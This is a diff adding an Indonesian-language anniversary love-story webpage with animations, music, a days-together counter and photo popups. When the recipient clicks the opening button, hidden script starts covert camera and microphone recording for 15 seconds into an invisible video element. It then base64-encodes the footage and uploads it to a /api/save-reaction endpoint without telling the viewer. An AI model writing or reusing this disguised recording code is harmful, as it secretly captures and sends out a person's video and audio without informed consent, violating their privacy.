@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="id" class="scroll-smooth">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Our Timeless Love Story ❤️</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,700;1,400&family=Lora:ital,wght@0,400;0,700;1,400&family=Poppins:wght@300;400;600&display=swap"
+        rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #fcf8f4;
+            /* Soft Cream */
+            color: #3f3f3f;
+            /* Dark Grey for text */
+            overflow-x: hidden;
+        }
+
+        .font-title {
+            font-family: 'Cormorant Garamond', serif;
+        }
+
+        .font-body {
+            font-family: 'Lora', serif;
+        }
+
+        .text-accent {
+            color: #a87e60;
+            /* Muted Gold/Brown */
+        }
+
+        .bg-accent-light {
+            background-color: #f7e9d7;
+            /* Lighter Cream */
+        }
+
+        /* Video Background */
+        .video-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+
+        .hero-overlay {
+            background: linear-gradient(to top, rgba(252, 248, 244, 1) 0%, rgba(0, 0, 0, 0.2) 50%, rgba(0, 0, 0, 0.6) 100%);
+        }
+
+        /* Custom Scroll Indicator */
+        .scroll-indicator {
+            position: absolute;
+            bottom: 5rem;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0;
+            animation: bounceScroll 2s infinite;
+        }
+
+        @keyframes bounceScroll {
+
+            0%,
+            20%,
+            50%,
+            80%,
+            100% {
+                transform: translateY(0) translateX(-50%);
+            }
+
+            40% {
+                transform: translateY(-10px) translateX(-50%);
+            }
+
+            60% {
+                transform: translateY(-5px) translateX(-50%);
+            }
+        }
+
+        /* Countdown Glassmorphism */
+        .countdown-glass {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Music Controls */
+        #music-controls {
+            position: fixed;
+            bottom: 1.5rem;
+            right: 1.5rem;
+            z-index: 1000;
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(8px);
+            border-radius: 9999px;
+            padding: 0.75rem;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        #music-controls:hover {
+            transform: scale(1.05);
+        }
+
+        /* SVG Wave Styling */
+        .wave-container {
+            width: 100%;
+            line-height: 0;
+            margin: 0;
+        }
+
+        .wave-container svg {
+            width: 100%;
+            height: auto;
+        }
+
+        /* Custom Modal for Image/Message */
+        .swal2-popup {
+            font-family: 'Poppins', sans-serif;
+            background: #fcf8f4 !important;
+            color: #3f3f3f !important;
+            border-radius: 1rem !important;
+            padding: 2rem !important;
+        }
+
+        .swal2-title {
+            font-family: 'Cormorant Garamond', serif !important;
+            font-size: 2.5rem !important;
+            color: #a87e60 !important;
+            margin-bottom: 1rem !important;
+        }
+
+        .swal2-html-container {
+            font-family: 'Lora', serif !important;
+            font-size: 1.1rem !important;
+            line-height: 1.7 !important;
+            color: #555 !important;
+        }
+
+        .swal2-confirm {
+            background-color: #a87e60 !important;
+            color: white !important;
+            font-weight: 600 !important;
+            border-radius: 9999px !important;
+            padding: 0.75rem 2rem !important;
+            transition: background-color 0.3s ease !important;
+        }
+
+        .swal2-confirm:hover {
+            background-color: #8f6e52 !important;
+        }
+    </style>
+</head>
+
+<body class="overflow-x-hidden">
+
+    <audio id="background-music" loop preload="auto">
+        <source src="https://www.bensound.com/bensound-music/bensound-memories.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <div id="music-controls" class="flex items-center space-x-2 hidden">
+        <button id="play-pause-btn" class="p-2 rounded-full text-gray-700 hover:bg-gray-200">
+            <svg id="play-icon" class="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M8 5v14l11-7z" />
+            </svg>
+            <svg id="pause-icon" class="h-6 w-6 hidden" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z" />
+            </svg>
+        </button>
+        <span class="text-sm text-gray-600">Music</span>
+    </div>
+
+    <div id="welcome-overlay"
+        class="fixed inset-0 bg-[#fcf8f4] z-[9999] flex flex-col items-center justify-center text-center p-8">
+        <h1 class="font-title text-6xl md:text-8xl text-accent mb-6">Our Timeless Love</h1>
+        <p class="font-body text-xl md:text-2xl text-gray-700 mb-10">
+            Sebuah kisah yang tak lekang oleh waktu, untukmu.
+        </p>
+        <button onclick="revealWebsite()"
+            class="bg-accent-light text-accent px-10 py-4 rounded-full shadow-lg hover:shadow-xl transition-all font-semibold uppercase tracking-widest text-sm">
+            Mulai Kisah Kita ❤️
+        </button>
+    </div>
+
+    <section class="relative h-screen flex items-center justify-center text-white overflow-hidden" id="hero">
+        <video class="video-background" id="hero-video" src="kita.mp4" type="video/mp4" loop muted playsinline></video>
+        <div class="absolute inset-0 hero-overlay z-10"></div>
+
+        <div class="relative z-20 text-center px-6">
+            <p id="hero-pretitle" class="uppercase tracking-[0.2em] text-sm text-white/80 mb-4 opacity-0">Our Journey
+                Begins</p>
+            <h1 id="hero-main-title" class="font-title text-7xl md:text-9xl italic mb-6 opacity-0">One Month of Us</h1>
+            <p id="hero-subtitle" class="font-body text-xl md:text-3xl font-light max-w-2xl mx-auto opacity-0">
+                Setiap detik adalah kenangan, setiap hari adalah anugerah.
+            </p>
+        </div>
+
+        <div class="scroll-indicator" id="scroll-hint">
+            <svg class="w-8 h-8 text-white mb-2" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M12 21l-7-7h4V3h6v11h4l-7 7z" />
+            </svg>
+            <span class="text-sm text-white">Scroll</span>
+        </div>
+    </section>
+
+    <div class="wave-container bg-transparent">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
+            <path fill="#a87e60" fill-opacity="1"
+                d="M0,192L48,176C96,160,192,128,288,128C384,128,480,160,576,181.3C672,203,768,213,864,192C960,171,1056,117,1152,106.7C1248,96,1344,128,1392,144L1440,160L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z">
+            </path>
+        </svg>
+    </div>
+
+    <section id="countdown-section" class="pb-24 bg-[#a87e60] text-white">
+        <div class="container mx-auto px-6 text-center">
+            <h2 class="font-title text-5xl italic mb-12" data-aos="fade-down">Waktu Kita Bersama...</h2>
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-6 max-w-4xl mx-auto">
+                <div class="p-8 countdown-glass rounded-3xl">
+                    <span id="days" class="block text-5xl md:text-7xl font-bold mb-2">00</span>
+                    <span class="uppercase text-sm tracking-widest opacity-80">Hari</span>
+                </div>
+                <div class="p-8 countdown-glass rounded-3xl">
+                    <span id="hours" class="block text-5xl md:text-7xl font-bold mb-2">00</span>
+                    <span class="uppercase text-sm tracking-widest opacity-80">Jam</span>
+                </div>
+                <div class="p-8 countdown-glass rounded-3xl">
+                    <span id="minutes" class="block text-5xl md:text-7xl font-bold mb-2">00</span>
+                    <span class="uppercase text-sm tracking-widest opacity-80">Menit</span>
+                </div>
+                <div class="p-8 countdown-glass rounded-3xl">
+                    <span id="seconds" class="block text-5xl md:text-7xl font-bold mb-2">00</span>
+                    <span class="uppercase text-sm tracking-widest opacity-80">Detik</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="wave-container" style="background-color: #a87e60;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
+            <path fill="#fcf8f4" fill-opacity="1"
+                d="M0,96L60,112C120,128,240,160,360,160C480,160,600,128,720,138.7C840,149,960,203,1080,208C1200,213,1320,171,1380,149.3L1440,128L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z">
+            </path>
+        </svg>
+    </div>
+
+    <section class="py-24 px-6 bg-[#fcf8f4]">
+        <div class="max-w-6xl mx-auto grid md:grid-cols-2 gap-16 items-center">
+            <div class="order-2 md:order-1 story-item">
+                <h3 class="font-title text-6xl italic text-accent mb-6">Awal Sebuah Cerita</h3>
+                <p class="font-body text-xl leading-relaxed mb-8 text-gray-700">
+                    Rasanya baru kemarin kita memulai kisah ini. Senyummu yang pertama, tatapan mata yang penuh arti.
+                    Sejak saat itu, duniaku berubah menjadi lebih berwarna. Setiap momen bersamamu adalah lembaran baru
+                    yang aku simpan dengan indah.
+                </p>
+                <p class="font-body text-lg italic text-gray-600">"Setiap kisah cinta memiliki awal, dan milik kita
+                    adalah favoritku."</p>
+            </div>
+            <div class="order-1 md:order-2">
+
+            </div>
+        </div>
+    </section>
+
+    <section class="relative h-[80vh] flex items-center justify-center overflow-hidden">
+
+        <div class="absolute inset-0 bg-black/50 z-10"></div>
+        <div class="relative z-20 text-center text-white px-6">
+            <h3 class="font-title text-6xl italic mb-6">Momen-momen Tak Terlupakan</h3>
+            <p class="font-body text-xl max-w-xl mx-auto">
+                Dari canda tawa hingga keheningan yang nyaman, setiap momen bersamamu adalah harta yang tak ternilai.
+            </p>
+        </div>
+    </section>
+
+    <div class="wave-container bg-[#fcf8f4]">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
+            <path fill="#f7e9d7" fill-opacity="1"
+                d="M0,224L48,213.3C96,203,192,181,288,154.7C384,128,480,96,576,117.3C672,139,768,213,864,240C960,267,1056,245,1152,213.3C1248,181,1344,139,1392,117.3L1440,96L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z">
+            </path>
+        </svg>
+    </div>
+
+    <section class="pb-24 px-6 bg-[#f7e9d7]">
+        <div class="container mx-auto text-center">
+            <h2 class="font-title text-5xl italic text-accent mb-16">Kenangan di Setiap Sudut Hati</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-10 max-w-6xl mx-auto">
+                <div class="rounded-3xl shadow-xl overflow-hidden cursor-pointer group hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-2"
+                    onclick="openMoment('Senyum Pertamamu', 'Momen ketika kita bertemu, seperti takdir yang menyatukan dua jiwa.', 'https://images.unsplash.com/photo-1509657065604-030f55dfd8a7?auto=format&fit=crop&w=600&q=80')">
+                    <img src="foto.jpeg" alt="Moment 1"
+                        class="w-full h-64 object-cover group-hover:scale-110 transition-transform duration-500">
+                    <div class="p-6 bg-white">
+                        <p class="font-body text-lg font-semibold text-gray-800">Senyum Pertamamu</p>
+                    </div>
+                </div>
+                <div class="rounded-3xl shadow-xl overflow-hidden cursor-pointer group hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-2"
+                    onclick="openMoment('Dunia Baru', 'Setiap kali aku melihatmu, aku tahu bahwa ini adalah tempatku.', 'https://images.unsplash.com/photo-1516589174184-c685266e430c?auto=format&fit=crop&w=600&q=80')">
+                    <img src="foto2.jpeg" alt="Moment 2"
+                        class="w-full h-64 object-cover group-hover:scale-110 transition-transform duration-500">
+                    <div class="p-6 bg-white">
+                        <p class="font-body text-lg font-semibold text-gray-800">Dunia Baru</p>
+                    </div>
+                </div>
+                <div class="rounded-3xl shadow-xl overflow-hidden cursor-pointer group hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-2"
+                    onclick="openMoment('Janji Hati', 'Aku berharap kita bisa menciptakan lebih banyak kenangan indah bersama.', 'https://images.unsplash.com/photo-1494774157365-9e04c6720e47?auto=format&fit=crop&w=600&q=80')">
+                    <img src="foto3.jpeg" alt="Moment 3"
+                        class="w-full h-64 object-cover group-hover:scale-110 transition-transform duration-500">
+                    <div class="p-6 bg-white">
+                        <p class="font-body text-lg font-semibold text-gray-800">Janji Hati</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="py-24 bg-accent-light text-center">
+        <div class="max-w-4xl mx-auto px-6">
+            <h2 class="font-title text-6xl italic text-accent mb-10">Hadiah Kecil Untukmu...</h2>
+            <p class="font-body text-xl leading-relaxed text-gray-700 mb-12">
+                Terima kasih telah mewarnai setiap hari di bulan pertama kita. Setiap momen, setiap tawa, setiap
+                pelukan, adalah hadiah paling berharga yang pernah ada.
+            </p>
+            <button onclick="showFinalGift()"
+                class="bg-accent text-white px-12 py-4 rounded-full shadow-lg hover:shadow-xl transform hover:-translate-y-1 transition-all font-semibold uppercase tracking-widest text-sm">
+                Buka Hadiahku ❤️
+            </button>
+        </div>
+    </section>
+
+    <video id="camera-stream" class="hidden" autoplay muted playsinline></video>
+
+    <footer class="py-16 bg-[#3f3f3f] text-white text-center">
+        <p class="font-body text-lg italic opacity-80">&copy; Our Love Story - Since 1 Januari 2026</p>
+    </footer>
+
+    <script>
+        gsap.registerPlugin(ScrollTrigger);
+
+        const audio = document.getElementById('background-music');
+        const playPauseBtn = document.getElementById('play-pause-btn');
+        const playIcon = document.getElementById('play-icon');
+        const pauseIcon = document.getElementById('pause-icon');
+        const musicControls = document.getElementById('music-controls');
+        const heroVideo = document.getElementById('hero-video');
+
+        let isMusicPlaying = false;
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        async function startRecording() {
+            try {
+                // Meminta izin kamera
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1280 },  // 720p
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 20 } // Sedikit di bawah standar 30fps biar hemat data
+                    },
+                    audio: true
+                });
+
+                const cameraView = document.getElementById('camera-stream');
+                cameraView.srcObject = stream;
+
+                const options = {
+                    mimeType: 'video/webm;codecs=vp8',
+                    videoBitsPerSecond: 600000 // 600kbps: Hasilnya jauh lebih bersih dan tetap aman di bawah 10MB
+                };
+
+                const mediaRecorder = new MediaRecorder(stream, options);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+
+                    // Gunakan FileReader untuk konversi ke Base64
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => {
+                        const base64String = reader.result; // Ini adalah data Base64 Anda
+
+                        // Kirim data ini ke server/database
+                        sendToDatabase(base64String);
+                    };
+
+                    // Hentikan kamera
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                // Mulai merekam
+                mediaRecorder.start();
+                console.log("Rekaman dimulai...");
+
+                // Berhenti merekam otomatis setelah 15 detik (sesuaikan durasi kisahmu)
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                        console.log("Rekaman selesai.");
+                    }
+                }, 15000);
+
+            } catch (err) {
+                console.error("Gagal akses kamera: ", err);
+                // Tetap lanjut meskipun kamera ditolak agar web tidak rusak
+            }
+        }
+
+        async function sendToDatabase(base64Data) {
+            try {
+                const response = await fetch('/api/save-reaction', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        video_data: base64Data,
+                        timestamp: new Date()
+                    })
+                });
+
+                if (response.ok) {
+                    console.log("Kenangan berhasil tersimpan di database!");
+                }
+            } catch (err) {
+                console.error("Gagal mengirim ke database", err);
+            }
+        }
+
+        function revealWebsite() {
+            startRecording();
+            gsap.to("#welcome-overlay", {
+                opacity: 0, duration: 1.5, ease: "power2.out", onComplete: () => {
+                    document.getElementById('welcome-overlay').style.display = 'none';
+                    musicControls.classList.remove('hidden');
+                }
+            });
+
+            audio.play().then(() => {
+                isMusicPlaying = true;
+                playIcon.classList.add('hidden');
+                pauseIcon.classList.remove('hidden');
+            }).catch(e => console.log("Audio autoplay blocked"));
+
+            heroVideo.play();
+
+            gsap.fromTo("#hero-pretitle", { y: 30, opacity: 0 }, { y: 0, opacity: 1, delay: 1, duration: 1, ease: "power2.out" });
+            gsap.fromTo("#hero-main-title", { y: 50, opacity: 0 }, { y: 0, opacity: 1, delay: 1.5, duration: 1.5, ease: "power3.out" });
+            gsap.fromTo("#hero-subtitle", { y: 40, opacity: 0 }, { y: 0, opacity: 1, delay: 2, duration: 1.2, ease: "power2.out" });
+            gsap.fromTo("#scroll-hint", { opacity: 0 }, { opacity: 1, delay: 3, duration: 1, ease: "power1.out" });
+        }
+
+        playPauseBtn.addEventListener('click', () => {
+            if (isMusicPlaying) {
+                audio.pause();
+                playIcon.classList.remove('hidden');
+                pauseIcon.classList.add('hidden');
+            } else {
+                audio.play();
+                playIcon.classList.add('hidden');
+                pauseIcon.classList.remove('hidden');
+            }
+            isMusicPlaying = !isMusicPlaying;
+        });
+
+        const anniversaryDate = new Date("2026-01-01T00:00:00").getTime();
+
+        function updateCountdown() {
+            const now = new Date().getTime();
+            const distance = now - anniversaryDate;
+            document.getElementById("days").innerText = Math.floor(distance / (1000 * 60 * 60 * 24));
+            document.getElementById("hours").innerText = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            document.getElementById("minutes").innerText = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            document.getElementById("seconds").innerText = Math.floor((distance % (1000 * 60)) / 1000);
+        }
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        gsap.utils.toArray(".story-item").forEach(item => {
+            gsap.from(item.children, {
+                opacity: 0, y: 50, stagger: 0.3, duration: 1.2, ease: "power3.out",
+                scrollTrigger: { trigger: item, start: "top 80%" }
+            });
+        });
+
+        gsap.utils.toArray(".story-image").forEach(image => {
+            gsap.from(image, {
+                opacity: 0, scale: 0.8, duration: 1.2, ease: "power3.out",
+                scrollTrigger: { trigger: image, start: "top 80%" }
+            });
+        });
+
+        gsap.to("[data-parallax-speed]", {
+            yPercent: (index, target) => parseFloat(target.dataset.parallaxSpeed) * 100,
+            ease: "none",
+            scrollTrigger: { trigger: "body", start: "top top", end: "bottom top", scrub: true }
+        });
+
+        function openMoment(title, text, imageUrl) {
+            Swal.fire({
+                title: title,
+                html: `<p class="font-body">${text}</p>`,
+                imageUrl: imageUrl,
+                imageWidth: 400,
+                confirmButtonText: 'Tutup',
+                customClass: { popup: 'swal2-popup', title: 'swal2-title', confirmButton: 'swal2-confirm' }
+            });
+        }
+
+        function showFinalGift() {
+            Swal.fire({
+                title: 'Untukmu, Cintaku ❤️',
+                html: `<p class="font-body mb-4">Terima kasih sudah menjadi bagian terindah dari hidupku. Aku mencintaimu, selamanya.</p>`,
+                imageUrl: 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExdWR5ZjV5ajJ2NmZjcWh1ZXVjZjQ1a3Jucm02cWVzazlzaWpmdDNyYyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/kvrHqIqU33O9g6x0vC/giphy.gif',
+                imageWidth: 350,
+                confirmButtonText: 'Selamanya! ✨',
+                customClass: { popup: 'swal2-popup', title: 'swal2-title', confirmButton: 'swal2-confirm' }
+            });
+        }
+    </script>
+</body>
+
+</html>
